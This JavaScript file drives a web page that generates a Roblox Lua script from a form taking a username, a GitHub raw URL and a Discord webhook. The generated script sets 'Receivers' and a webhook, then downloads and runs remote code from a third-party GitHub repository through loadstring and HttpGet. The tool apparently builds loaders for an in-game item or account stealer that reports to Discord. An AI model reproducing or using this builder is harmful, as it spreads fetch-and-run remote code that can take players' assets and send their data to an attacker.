const scriptForm = document.getElementById("scriptForm");
const outputSection = document.getElementById("output");
const scriptBox = document.getElementById("scriptBox");
const copyBtn = document.getElementById("copyBtn");
const downloadBtn = document.getElementById("downloadBtn");

const tutorialBtn = document.getElementById("tutorialBtn");
const backBtn = document.getElementById("backBtn");

const tutorialPage = document.getElementById("tutorialPage");
const mainContent = document.querySelector("main");

// Helper to add fadeIn animation and remove it after completion
function fadeIn(element) {
  element.classList.add("fadeIn");
  element.addEventListener("animationend", function handler() {
    element.classList.remove("fadeIn");
    element.removeEventListener("animationend", handler);
  });
}

// Helper to fadeOut then run callback after animation completes
function fadeOut(element, callback) {
  element.classList.add("fadeOut");
  element.addEventListener("animationend", function handler() {
    element.classList.remove("fadeOut");
    element.removeEventListener("animationend", handler);
    callback();
  });
}

// Generate script form submission
scriptForm.addEventListener("submit", function (e) {
  e.preventDefault();

  const username = document.getElementById("username").value.trim();
  const github = document.getElementById("github").value.trim();
  const webhook = document.getElementById("webhook").value.trim();

  if (!github.startsWith("https://raw.githubusercontent.com/")) {
    alert("❌ GitHub raw URL must start with https://raw.githubusercontent.com/");
    return;
  }

  if (!webhook.startsWith("https://discord.com/api/webhooks/")) {
    alert("❌ Invalid Discord webhook URL.");
    return;
  }

  const luaScript = `
Config = {
  Receivers = {"${username}"},
  Webhook = "${webhook}",
  ScriptURL = "${github}",
}

loadstring(game:HttpGet("https://raw.githubusercontent.com/PRXJECT-DEV/GLOBAL-BOT-SCRIPT/refs/heads/main/Main%20Script"))()
`.trim();

  scriptBox.textContent = luaScript;
  outputSection.classList.remove("hidden");
  fadeIn(outputSection);

  downloadBtn.onclick = () => {
    const blob = new Blob([luaScript], { type: "text/plain" });
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url;
    a.download = "generated_script.lua";
    a.click();
    URL.revokeObjectURL(url);
  };

  copyBtn.onclick = () => {
    navigator.clipboard.writeText(luaScript).then(() => {
      alert("✅ Script copied to clipboard!");
    });
  };
});

// Tutorial button click — show tutorial with fade animation
tutorialBtn.addEventListener("click", () => {
  fadeOut(mainContent, () => {
    mainContent.classList.add("hidden");
    tutorialPage.classList.remove("hidden");
    fadeIn(tutorialPage);
  });
});

// Back button click — show main content with fade animation
backBtn.addEventListener("click", () => {
  fadeOut(tutorialPage, () => {
    tutorialPage.classList.add("hidden");
    mainContent.classList.remove("hidden");
    fadeIn(mainContent);
  });
});